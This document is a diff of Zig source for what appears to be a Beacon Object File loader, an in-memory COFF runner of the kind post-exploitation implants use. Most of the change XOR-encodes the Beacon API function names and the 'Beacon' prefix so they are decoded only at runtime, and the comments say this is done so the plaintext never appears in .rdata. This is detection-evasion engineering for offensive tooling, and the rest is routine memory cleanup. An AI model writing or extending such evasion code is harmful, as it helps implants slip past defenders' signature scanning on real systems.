@@ -6,6 +6,7 @@ const std = @import("std");
 const coff = @import("coff.zig");
 const beacon = @import("beacon.zig");
 const crt = @import("crt.zig");
+const stealth = @import("../stealth.zig");
 const winapi = @import("../winapi.zig");
 
 const Coff = coff.Coff;
@@ -35,7 +36,7 @@ pub fn runBof(alloc: std.mem.Allocator, coff_bytes: []const u8, args: []const u8
 
     // Build the external symbol -> address map (loader-provided symbols).
     var externals = try buildExternalMap(alloc);
-    defer externals.deinit();
+    defer deinitExternals(alloc, &externals);
 
     const ext_slots = try resolveExternalSlots(alloc, &parsed, &externals);
     defer alloc.free(ext_slots);
@@ -172,19 +173,31 @@ fn resolveSymbol(
 }
 
 const ExtEntry = struct { name: []const u8, addr: usize };
+const BeaconEntry = struct { enc: []const u8, addr: usize };
 
+/// Build the external symbol -> address map. Beacon API names are XOR-decoded
+/// at runtime (plaintext never in `.rdata`); CRT helper names stay literal
+/// (every C program has them). All keys are heap-owned by the map — free with
+/// `deinitExternals`.
 fn buildExternalMap(alloc: std.mem.Allocator) !std.StringHashMap(usize) {
     var m = std.StringHashMap(usize).init(alloc);
-    errdefer m.deinit();
+    errdefer deinitExternals(alloc, &m);
 
-    const entries = [_]ExtEntry{
-        .{ .name = "BeaconDataParse", .addr = @intFromPtr(&beacon.BeaconDataParse) },
-        .{ .name = "BeaconDataInt", .addr = @intFromPtr(&beacon.BeaconDataInt) },
-        .{ .name = "BeaconDataShort", .addr = @intFromPtr(&beacon.BeaconDataShort) },
-        .{ .name = "BeaconDataExtract", .addr = @intFromPtr(&beacon.BeaconDataExtract) },
-        .{ .name = "BeaconOutput", .addr = @intFromPtr(&beacon.BeaconOutput) },
-        .{ .name = "BeaconPrintf", .addr = @intFromPtr(&beacon.BeaconPrintf) },
-        .{ .name = "BeaconIsAdmin", .addr = @intFromPtr(&beacon.BeaconIsAdmin) },
+    const beacon_entries = [_]BeaconEntry{
+        .{ .enc = &stealth.ENC_BEACON_DATA_PARSE, .addr = @intFromPtr(&beacon.BeaconDataParse) },
+        .{ .enc = &stealth.ENC_BEACON_DATA_INT, .addr = @intFromPtr(&beacon.BeaconDataInt) },
+        .{ .enc = &stealth.ENC_BEACON_DATA_SHORT, .addr = @intFromPtr(&beacon.BeaconDataShort) },
+        .{ .enc = &stealth.ENC_BEACON_DATA_EXTRACT, .addr = @intFromPtr(&beacon.BeaconDataExtract) },
+        .{ .enc = &stealth.ENC_BEACON_OUTPUT, .addr = @intFromPtr(&beacon.BeaconOutput) },
+        .{ .enc = &stealth.ENC_BEACON_PRINTF, .addr = @intFromPtr(&beacon.BeaconPrintf) },
+        .{ .enc = &stealth.ENC_BEACON_IS_ADMIN, .addr = @intFromPtr(&beacon.BeaconIsAdmin) },
+    };
+    for (beacon_entries) |e| {
+        const name = try stealth.decAlloc(alloc, e.enc);
+        try m.put(name, e.addr);
+    }
+
+    const crt_entries = [_]ExtEntry{
         .{ .name = "memcpy", .addr = @intFromPtr(&crt.rtMemcpy) },
         .{ .name = "memmove", .addr = @intFromPtr(&crt.rtMemmove) },
         .{ .name = "memset", .addr = @intFromPtr(&crt.rtMemset) },
@@ -194,8 +207,18 @@ fn buildExternalMap(alloc: std.mem.Allocator) !std.StringHashMap(usize) {
         .{ .name = "___chkstk_ms", .addr = @intFromPtr(&crt.rtChkstk) },
         .{ .name = "_chkstk", .addr = @intFromPtr(&crt.rtChkstk) },
     };
-    for (entries) |e| try m.put(e.name, e.addr);
+    for (crt_entries) |e| {
+        const name = try alloc.dupe(u8, e.name);
+        try m.put(name, e.addr);
+    }
     return m;
+}
+
+/// Free every owned key, then the map itself.
+fn deinitExternals(alloc: std.mem.Allocator, m: *std.StringHashMap(usize)) void {
+    var it = m.iterator();
+    while (it.next()) |kv| alloc.free(kv.key_ptr.*);
+    m.deinit();
 }
 
 fn resolveExternalSlots(alloc: std.mem.Allocator, parsed: *const Coff, externals: *std.StringHashMap(usize)) ![]Slot {
@@ -228,7 +251,11 @@ fn resolveExternalByName(name: []const u8) ?usize {
     for (libs) |lib| {
         if (winapi.procAddr(lib, name)) |a| return a;
     }
-    if (std.mem.startsWith(u8, name, "Beacon")) {
+    // Any other `Beacon*` symbol we haven't stubbed -> no-op stub. Decode the
+    // 6-byte prefix at runtime so "Beacon" isn't a `.rdata` literal.
+    var prefix: [stealth.ENC_BEACON_PREFIX.len]u8 = undefined;
+    stealth.decInto(&stealth.ENC_BEACON_PREFIX, &prefix);
+    if (std.mem.startsWith(u8, name, &prefix)) {
         return @intFromPtr(&beacon.beaconUnimplemented);
     }
     return null;
